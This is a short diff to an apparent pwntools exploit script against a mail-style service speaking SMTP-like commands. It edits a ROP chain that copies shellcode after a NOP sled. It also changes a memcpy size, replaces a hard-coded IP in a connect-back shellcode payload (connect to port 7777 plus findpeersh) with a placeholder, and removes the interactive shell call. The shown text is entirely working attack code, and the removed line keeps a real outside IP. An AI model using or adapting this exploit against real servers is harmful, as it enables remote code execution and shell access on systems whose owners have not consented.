@@ -154,7 +154,7 @@ ropchain += (
     # Setup memcpy parameters
     #
     + p32(POP_EBX)
-    + p32(0x1000)
+    + p32(0x300)
     #
     # Copy shellcode to allocated memory
     #
@@ -166,7 +166,7 @@ ropchain += (
     #
     + b"\x90" * 128
     + asm(
-        shellcraft.i386.linux.connect("51.75.160.30", 7777, "ipv4")
+        shellcraft.i386.linux.connect("YOUR-IP-ADDRESS", 7777, "ipv4")
         + shellcraft.i386.linux.findpeersh(7777)
     )
 )
@@ -178,5 +178,3 @@ p.send(b".\r\n")  # End of text
 
 p.send(b"RSET\r\n")
 p.send(b"QUIT\r\n")
-
-p.interactive()
